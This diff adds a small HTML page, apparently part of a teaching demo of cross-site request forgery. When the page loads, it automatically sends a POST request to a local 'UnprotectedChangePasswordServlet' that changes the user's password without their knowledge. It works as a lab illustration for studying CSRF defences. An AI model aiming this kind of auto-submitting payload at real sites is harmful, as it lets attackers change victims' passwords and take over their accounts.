@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+    <link rel="stylesheet" type="text/css" href="resources/css/styles.css" />
+
+    <script type="text/javascript">
+        function sendForm() {
+            var params = "newPassword=XMLHttpRequest&confirmPassword=XMLHttpRequest";
+            var request = new XMLHttpRequest();
+
+            request.open("POST", "http://localhost:8080/CSRF/UnprotectedChangePasswordServlet", true);
+            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            request.send(params);
+        }
+    </script>
+</head>
+<body onload="sendForm()">
+    <h1>CSRF: Unprotected XMLHttpRequest</h1>
+
+    <p>Use the Web Developer tool to see the Post request</p>
+
+    <p><a href="requests-unprotected.html">Back</a></p>
+</body>
+</html>
